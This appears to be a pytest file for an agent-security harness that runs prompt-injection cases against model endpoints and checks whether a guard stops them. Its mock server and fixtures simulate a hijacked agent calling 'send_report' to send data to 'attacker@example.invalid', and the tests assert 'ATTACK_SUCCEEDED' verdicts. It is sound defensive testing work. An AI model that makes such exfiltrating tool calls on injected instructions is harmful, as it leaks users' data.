import asyncio
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
from agentsec.adapters import read_limited, run_http, run_openai
from agentsec.cases import builtin_cases
from agentsec.engine import configure_inspect, evaluate_attempt


@pytest.fixture
def model_server():
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            if self.path == "/agent":
                response = {
                    "output": "我拒绝了",
                    "events": [{"kind": "tool.completed", "tool": "send_report"}],
                }
            else:
                tools_used = any(x["role"] == "tool" for x in body["messages"])
                message = {"role": "assistant", "content": "订单处理中"}
                if not tools_used:
                    message = {
                        "role": "assistant",
                        "content": None,
                        "tool_calls": [
                            {
                                "id": "call-1",
                                "type": "function",
                                "function": {
                                    "name": "send_report",
                                    "arguments": '{"recipient":"attacker@example.invalid"}',
                                },
                            }
                        ],
                    }
                response = {"choices": [{"message": message}], "usage": {"total_tokens": 50}}
            encoded = json.dumps(response).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(encoded)))
            self.end_headers()
            self.wfile.write(encoded)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield "http://127.0.0.1:" + str(server.server_port)
    server.shutdown()
    server.server_close()
    thread.join()


async def test_real_http_tool_loop_injects_and_records(settings, model_server):
    case = builtin_cases()[0]
    budget = {"max_turns": 3, "max_tool_calls": 5, "max_tokens": 512, "max_total_tokens": 500}
    evidence = await run_openai(
        settings,
        case,
        {"base_url": model_server + "/v1", "model": "test", "guard": "none"},
        "test-token",
        budget,
    )
    assert evidence["complete"]
    assert evidence["tokens"] == 100
    exchanges = evidence["transcript"]["exchanges"]
    assert len(exchanges) == 2
    assert exchanges[0]["request"]["messages"][0]["role"] == "system"
    assert exchanges[0]["response"]["message"]["tool_calls"][0]["function"]["name"] == "send_report"
    assert exchanges[0]["tool_results"][0]["name"] == "send_report"
    assert any(message["role"] == "tool" for message in exchanges[1]["request"]["messages"])
    assert "test-token" not in json.dumps(evidence["transcript"])
    assert any(
        e["kind"] == "tool.completed" and e["tool"] == "send_report" for e in evidence["events"]
    )
    protected = await run_openai(
        settings,
        case,
        {"base_url": model_server + "/v1", "model": "test", "guard": "strict"},
        "",
        budget,
    )
    assert protected["blocked"]
    assert not any(e["kind"] == "tool.completed" for e in protected["events"])


async def test_http_agent_trace_is_ignored(settings, model_server):
    evidence = await run_http(
        settings, builtin_cases()[0], {"endpoint": model_server + "/agent"}, "", {}, "test-attempt"
    )
    assert evidence["provenance"] == "application-output"
    assert evidence["events"] == []


async def test_real_http_budget_exhaustion(settings, model_server):
    evidence = await run_openai(
        settings,
        builtin_cases()[0],
        {"base_url": model_server + "/v1", "model": "test", "guard": "none"},
        "",
        {"max_turns": 3, "max_tool_calls": 3, "max_tokens": 64, "max_total_tokens": 10},
    )
    assert evidence["error_code"] == "TOKEN_BUDGET_EXCEEDED"
    assert not evidence["complete"]


@pytest.mark.parametrize("failure", ["exception", "timeout"])
async def test_effect_evidence_survives_later_failure(settings, monkeypatch, failure):
    count = 0

    async def respond(*args):
        nonlocal count
        count += 1
        if count > 1:
            if failure == "timeout":
                await asyncio.sleep(2)
            raise ValueError("secret-in-error-must-not-be-stored")
        return {
            "usage": {"total_tokens": 10},
            "choices": [
                {
                    "message": {
                        "tool_calls": [
                            {
                                "id": "call-1",
                                "function": {
                                    "name": "send_report",
                                    "arguments": '{"recipient":"attacker@example.invalid"}',
                                },
                            }
                        ]
                    }
                }
            ],
        }

    monkeypatch.setattr("agentsec.adapters.bounded_request", respond)
    configure_inspect(settings)
    result = await evaluate_attempt(
        settings,
        {
            "kind": "openai",
            "config": {"base_url": "http://127.0.0.1/v1", "model": "test", "guard": "none"},
        },
        builtin_cases()[0],
        "",
        {
            "max_turns": 3,
            "max_tool_calls": 3,
            "max_tokens": 64,
            "max_total_tokens": 500,
            "timeout_seconds": 0.1,
        },
        "preserve-" + failure,
    )
    assert result["verdict"] == "ATTACK_SUCCEEDED"
    assert not result["evidence"]["complete"]
    assert any(e["kind"] == "tool.completed" for e in result["evidence"]["events"])
    assert "secret-in-error" not in json.dumps(result)


async def test_multiturn_uses_actual_model_responses(settings, monkeypatch):
    requests = []

    async def respond(settings, endpoint, secret, body):
        requests.append(json.loads(json.dumps(body)))
        return {
            "choices": [{"message": {"content": "actual-reply-" + str(len(requests))}}],
            "usage": {"total_tokens": 10},
        }

    monkeypatch.setattr("agentsec.adapters.bounded_request", respond)
    case = builtin_cases()[0]
    case["spec"]["setup_turns"] = ["setup-one", "setup-two"]
    evidence = await run_openai(
        settings,
        case,
        {"base_url": "http://127.0.0.1/v1", "model": "test"},
        "",
        {"max_turns": 3, "max_tool_calls": 3, "max_tokens": 64, "max_total_tokens": 500},
    )
    assert evidence["complete"]
    assert len(requests) == 3
    assistants = [m["content"] for m in requests[-1]["messages"] if m["role"] == "assistant"]
    assert assistants == ["actual-reply-1", "actual-reply-2"]


async def test_subprocess_output_is_bounded():
    stream = asyncio.StreamReader()
    stream.feed_data(b"x" * 129)
    stream.feed_eof()
    with pytest.raises(ValueError, match="SUBPROCESS_OUTPUT_LIMIT"):
        await read_limited(stream, 128)
    stream = asyncio.StreamReader()
    stream.feed_data(b"x" * 128)
    stream.feed_eof()
    assert await read_limited(stream, 128) == b"x" * 128
